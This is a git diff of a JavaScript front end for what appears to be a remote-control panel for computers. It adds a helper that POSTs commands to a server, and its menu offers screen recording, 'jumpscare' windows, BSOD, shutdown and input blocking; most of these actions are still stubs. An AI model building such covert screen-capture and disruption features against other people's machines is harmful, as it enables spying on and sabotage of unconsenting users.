@@ -11,6 +11,7 @@ const menu = document.querySelector('.menu');
 const log = document.querySelector('.log');
 const duration = 5;
 
+let optionsMenu = null
 let currentComputer = '';
 let currentTime = '';
 let retryNum = 0
@@ -68,6 +69,32 @@ async function refreshPCList() {
     computerItems = document.querySelectorAll('.computer-list li');
 }
 
+async function sendAction(action, extra = {}) {
+    try {
+        const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                action,
+                ...extra
+            })
+        })
+
+        if (!res.ok) {
+            throw new Error(`HTTP ${res.status}`)
+        }
+
+        const data = await res.json()
+        terminal.log(`"${JSON.stringify(data)}"`)
+        return data
+
+    } catch (err) {
+        terminal.error(`Failed to send "${action}"`)
+        console.error(err)
+    }
+}
+
+
 setTimeout(() => {
     if (token != '') {
         if (localStorage.getItem('cslckrmngr_token') == token.substring(7) || localStorage.getItem('cslckrmngr_token') != undefined) {
@@ -99,10 +126,6 @@ setTimeout(() => {
 }, 1000);
 
 (async () => {
-
-    let optionsMenu = null
-    let computerName = null
-
     options.classList.add('disabled')
     options.style.pointerEvents = 'none'
     options.style.opacity = '0.4'
@@ -120,25 +143,32 @@ setTimeout(() => {
             <button data-action="block">Block Inputs</button>
             <button data-action="update">Release Update</button>
         `
-        options.appendChild(optionsMenu)
+        menu.appendChild(optionsMenu)
     }
 
-    options.addEventListener('click', () => {
-        if (options.classList.contains('disabled')) return
+    function closeOptionsMenu() {
+        if (!optionsMenu) return
 
+        optionsMenu.classList.remove('show')
+        options.classList.remove('active')
+    }
+
+    options.addEventListener('click', e => {
+        e.stopPropagation()
         if (!optionsMenu) createOptionsMenu()
+
+        const rect = options.getBoundingClientRect();
+
+        optionsMenu.style.left = `${rect.right - optionsMenu.offsetWidth}px`;
+        optionsMenu.style.top = `${rect.top - optionsMenu.offsetHeight - 6}px`;
 
         optionsMenu.classList.toggle('show')
         options.classList.toggle('active')
     })
 
     document.addEventListener('click', e => {
-        alert(e.target)
-        if (e.target != options  && e.target != optionsMenu && optionsMenu.classList) {
-            alert('bom')
-            alert(optionsMenu)
-            optionsMenu.classList.toggle('show')
-            options.classList.remove('active')
+        if (!options.contains(e.target)) {
+            closeOptionsMenu()
         }
     })
 
@@ -146,86 +176,77 @@ setTimeout(() => {
         if (e.key === 'Escape') closeOptionsMenu()
     })
 
-    function openRecordPopup() {
+    function openPopup(popup_name, popup_button, input_type, action) {
         const overlay = document.createElement('div')
-        overlay.style.position = 'fixed'
-        overlay.style.inset = '0'
-        overlay.style.background = 'rgba(0,0,0,0.6)'
-        overlay.style.display = 'flex'
-        overlay.style.alignItems = 'center'
-        overlay.style.justifyContent = 'center'
-        overlay.style.zIndex = '99999'
+        overlay.className = 'popup-overlay'
 
         const popup = document.createElement('div')
-        popup.style.background = '#141414'
-        popup.style.border = '1px solid #c2580280'
-        popup.style.borderRadius = '10px'
-        popup.style.padding = '20px'
-        popup.style.width = '260px'
-        popup.style.textAlign = 'center'
+        popup.className = 'popup-box'
+
+        const inputHTML = input_type === 'number'
+            ? '<input type="number" min="1" value="5" class="popup-input">'
+            : input_type === 'string'
+            ? '<input type="text" class="popup-input">'
+            : ''
 
         popup.innerHTML = `
-            <p style="margin:0 0 12px">Recording duration (seconds)</p>
-            <input type="number" min="1" value="5" style="width:100%;padding:6px;margin-bottom:12px;background:#0f0f0f;color:#fff;border:1px solid #c2580280;border-radius:6px">
-            <button style="width:100%;padding:8px;background:#c25802;border:none;border-radius:6px;color:#fff;cursor:pointer">Start Recording</button>
+            <p>${popup_name}</p>
+            ${inputHTML}
+            <button class="popup-button">${popup_button}</button>
         `
 
         overlay.appendChild(popup)
         document.body.appendChild(overlay)
 
-        const input = popup.querySelector('input')
-        const btn = popup.querySelector('button')
+        const button = popup.querySelector('.popup-button')
+        const input = popup.querySelector('.popup-input')
 
-        btn.addEventListener('click', async () => {
-            const duration = Number(input.value)
-            if (!duration || duration <= 0) return
-
-            const now = new Date()
-            const year = now.getFullYear()
-            const month = String(now.getMonth() + 1).padStart(2, '0')
-            const day = String(now.getDate()).padStart(2, '0')
-            const hours = String(now.getHours()).padStart(2, '0')
-            const minutes = String(now.getMinutes()).padStart(2, '0')
-
-            currentTime = `${year}-${month}-${day}_${hours}-${minutes}`
-
-            terminal.log(`POSTED: record-${computerName}-${currentTime} (${duration}s)`)
-
-            await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    action: `record-${computerName}`,
-                    time: currentTime,
-                    duration: duration
-                })
-            })
-
-            renderVideo(computerName, currentTime)
-
-            overlay.remove()
-            closeOptionsMenu()
+        button.addEventListener('click', () => {
+            const value = input ? input.value : null
+            action(value)
+            document.body.removeChild(overlay)
         })
 
         overlay.addEventListener('click', e => {
-            if (e.target === overlay) overlay.remove()
+            if (e.target === overlay) document.body.removeChild(overlay)
+        })
+
+        document.addEventListener('keydown', function escHandler(e) {
+            if (e.key === 'Escape') {
+                document.body.removeChild(overlay)
+                document.removeEventListener('keydown', escHandler)
+            }
         })
     }
 
-    document.addEventListener('click', e => {
+    document.addEventListener('click', async e => {
         const btn = e.target.closest('.options-menu button')
         if (!btn) return
-
         const action = btn.dataset.action
 
-        if (action === 'record') openRecordPopup()
-        if (action === 'clear') terminal.clear()
-        if (action === 'jumpscare') terminal.warn(`Jumpscare sent to ${computerName}`)
-        if (action === 'shutdown') terminal.error('Shutdown signal sent')
-        if (action === 'bsod') terminal.error('BSOD triggered')
-        if (action === 'flash') terminal.warn('Flash command issued')
-        if (action === 'block') terminal.warn('Inputs blocked')
-        if (action === 'update') terminal.log('Update released')
+        if (action === 'record') {
+            const now = new Date()
+            currentTime = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}_${String(now.getHours()).padStart(2, '0')}-${String(now.getMinutes()).padStart(2, '0')}`
+
+            terminal.log(`POSTED: record-${computerName}-${currentTime} (${duration}s)`)
+            openPopup('Recording duration', 'Start recording', 'number', async (value) => await sendAction(`record-${computerName}`, { time: currentTime, duration: duration }))
+            renderVideo(computerName, currentTime)
+        } else if (action === 'clear') { 
+            terminal.clear()
+        } else if (action === 'jumpscare') {
+            alert('ede')
+            openPopup('Window amount', 'Send request', 'number',  async (value) => await sendAction(`jumpscare-${computerName}`, { data: value }))
+        } else if (action === 'shutdown') { 
+            terminal.error('Shutdown signal sent')
+        } else if (action === 'bsod') { 
+            terminal.error('BSOD triggered')
+        } else if (action === 'flash')  {
+            terminal.warn('Flash command issued')
+        } else if (action === 'block') { 
+            terminal.warn('Inputs blocked')
+        } else if (action === 'update') {
+            terminal.log('Update released')
+        }
     })
 
     const res = await fetch('https://cslckrwbcl.lrdevstudio.com/messages', {
@@ -288,6 +309,9 @@ async function renderVideo(computer, timestamp) {
     } else if (text.includes('screen-recording-ready')) {
         terminal.log("Video ready, rendering")
 
+        if (!displayBox) videoArea = document.querySelector('.screen-rec')
+        if (displayBox) videoArea = displayBox
+        
         displayBox.outerHTML = `
             <video class='screen-rec' controls autoplay muted>
                 <source src="/fetch_recording/${computer}/${timestamp}" type="video/mp4">
